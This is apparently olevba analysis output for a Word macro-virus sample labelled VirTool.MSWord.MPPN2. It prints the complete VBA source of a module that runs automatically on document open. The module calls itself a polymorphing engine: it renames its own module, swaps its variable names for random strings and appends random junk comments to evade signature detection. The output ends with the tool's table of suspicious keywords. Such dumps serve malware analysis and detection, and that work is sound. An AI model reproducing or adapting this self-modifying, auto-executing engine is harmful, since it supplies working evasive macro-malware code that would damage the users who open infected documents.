olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.MPPN2-f20470716ad4b7e5fe3a32bccfe8bec26d59cc31
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: VirTool.MSWord.MPPN2-f20470716ad4b7e5fe3a32bccfe8bec26d59cc31 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO KGB.bas 
in file: VirTool.MSWord.MPPN2-f20470716ad4b7e5fe3a32bccfe8bec26d59cc31 - OLE stream: 'Macros/VBA/KGB'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'KGB 'F}v!
'MI_pirat's PolyMorphing Ngine '<fo!
On Error Resume Next 'tyH!
If ThisDocument.Name <> NormalTemplate.Name Then '„7X!
KCBM1 = 12 '�x!
ReDim WLBM1(1 To KCBM1) As String ''*’!
WLBM1(1) = "KCBM1": WLBM1(2) = "BFHM1": WLBM1(3) = "RKBM1" '>e+!
WLBM1(4) = "WLBM1": WLBM1(5) = "DOKM1": WLBM1(6) = "KSMM1": WLBM1(7) = "NFLM1" '^)„!
WLBM1(8) = "GFDM1": WLBM1(9) = "EGXM1": WLBM1(10) = "TJGM1": WLBM1(11) = "EYQM1"
WLBM1(12) = "TUMM1" 'UM’!
BFHM1 = ActiveDocument.Content '%`8!
'find and change the module name (100% poly) 'Yy„!
For NFLM1 = 1 To ActiveDocument.VBProject.VBComponents.Count 'I-‹!
TJGM1 = ActiveDocument.VBProject.VBComponents(NFLM1).CodeModule.Lines(2, 1) ']5H!
GFDM1 = Mid(TJGM1, 1, 1) 'E8`!
EGXM1 = Len(TJGM1) '6?2!
If EGXM1 >= 4 Then EYQM1 = Mid(TJGM1, 2, 3) '\e}!
If (GFDM1 = "'") And (EYQM1 = ActiveDocument.VBProject.VBComponents(NFLM1).Name) Then '`ˆN!
Randomize '„ˆf!
EYQM1 = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65))
ActiveDocument.VBProject.VBComponents(NFLM1).CodeModule.ReplaceLine 2, "'" + EYQM1
ActiveDocument.VBProject.VBComponents(NFLM1).Name = EYQM1 'pm7!
TUMM1 = NFLM1 'b/O!
End If '‚E>!
Next NFLM1 '+}^!
'copy this code to the doc '�[c!
ActiveDocument.Windows(1).WindowState = wdWindowStateMinimize
ActiveDocument.Content = "" '—ŽI!
RKBM1 = ActiveDocument.VBProject.VBComponents(TUMM1).CodeModule.CountOfLines '6:l!
'copy this source into the doc (so I can modify it) 'C>Y!
For NFLM1 = 1 To RKBM1 'wo[!
ActiveDocument.Content = ActiveDocument.Content + ActiveDocument.VBProject.VBComponents(TUMM1).CodeModule.Lines(NFLM1, 1)
Next NFLM1 '$VW!
'now find the vars and poymorph 'em !
For NFLM1 = 1 To KCBM1 'K„+!
Randomize 'sXJ!
KSMM1 = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "M1"
Set DOKM1 = ActiveDocument.Content '@D`!
DOKM1.Find.Execute FindText:=WLBM1(NFLM1), ReplaceWith:=KSMM1, Replace:=wdReplaceAll
Next NFLM1 'z]W!
'copy everythig back to its origin '-L“!
RKBM1 = ActiveDocument.VBProject.VBComponents(TUMM1).CodeModule.CountOfLines '>q3!
ActiveDocument.VBProject.VBComponents(TUMM1).CodeModule.DeleteLines 1, RKBM1 'I02!
KSMM1 = ActiveDocument.Content 'f~‚!
ActiveDocument.VBProject.VBComponents(TUMM1).CodeModule.AddFromString KSMM1 'A�!
ActiveDocument.Content = "" '‰0b!
ActiveDocument.Content = BFHM1 'm^ˆ!
mm: 'ˆRz!
If ActiveDocument.VBProject.VBComponents(TUMM1).CodeModule.Lines(1, 1) <> "Sub AutoOpen()" Then
ActiveDocument.VBProject.VBComponents(TUMM1).CodeModule.DeleteLines 1, 1 'w|\!
GoTo mm 'kmd!
End If 'F: !
KCBM1 = ActiveDocument.VBProject.VBComponents.Item(TUMM1).CodeModule.CountOfLines
For NFLM1 = 2 To KCBM1 '*6`!
TJGM1 = ActiveDocument.VBProject.VBComponents(TUMM1).CodeModule.Lines(NFLM1, 1) 'q3s!
EYQM1 = Mid(TJGM1, Len(TJGM1)) '&E“!
If (EYQM1 <> "!") And (Len(TJGM1) < 80) Then 'hi+!
GFDM1 = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
KSMM1 = TJGM1 + " '" + GFDM1 + "!" '?MŠ!
ActiveDocument.VBProject.VBComponents.Item(TUMM1).CodeModule.ReplaceLine NFLM1, KSMM1
End If 'r\„!
Next NFLM1 ':†}!
ActiveDocument.VBProject.VBComponents(TUMM1).CodeModule.DeleteLines KCBM1, 1 '”2B!
ActiveDocument.Windows(1).WindowState = wdWindowStateMaximize
End If '#:!
End Sub 'r?)!
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

